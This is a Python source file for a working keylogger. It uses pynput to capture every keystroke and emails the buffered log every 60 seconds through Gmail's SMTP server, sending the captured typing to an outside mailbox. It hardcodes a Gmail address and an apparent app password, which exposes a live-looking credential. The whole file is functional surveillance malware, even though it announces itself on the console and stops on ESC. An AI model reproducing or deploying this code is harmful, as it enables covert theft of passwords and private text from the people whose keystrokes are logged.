from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
import threading
import datetime

# --- Email configuration ---
EMAIL_ADDRESS = "sanaaakadam@gmail.com"
EMAIL_PASSWORD = "lpqt keke dptb ikpb"  # App Password for Gmail
RECEIVER_EMAIL = "sanaaakadam@gmail.com"
SEND_INTERVAL = 60  # seconds

# --- Global buffer ---
log_buffer = ""
stop_flag = False

# --- Send email function ---
def send_email(log):
    if not log.strip():
        return
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        msg = MIMEText(f"Time: {timestamp}\n\n{log}")
        msg['Subject'] = '🛡️ Keylogger Log Data'
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = RECEIVER_EMAIL

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(msg)

        print("[+] Email sent successfully.")
    except Exception as e:
        print(f"[!] Failed to send email: {e}")

# --- Periodic sender ---
def send_periodically():
    global log_buffer, stop_flag
    if stop_flag:
        return  # Stop scheduling if user exited
    if log_buffer.strip():
        send_email(log_buffer)
        log_buffer = ""
    threading.Timer(SEND_INTERVAL, send_periodically).start()

# --- Key press handler ---
def on_press(key):
    global log_buffer, stop_flag
    try:
        log_buffer += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log_buffer += ' '
        elif key == keyboard.Key.enter:
            log_buffer += '\n'
        elif key == keyboard.Key.esc:
            print("[*] ESC pressed. Exiting keylogger...")
            send_email(log_buffer)  # Send any remaining logs
            stop_flag = True
            return False  # Stop listener
        else:
            log_buffer += f' [{key.name}] '

# --- Entry Point ---
if __name__ == "__main__":
    print("[*] Keylogger started. Press ESC to stop.")
    send_periodically()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
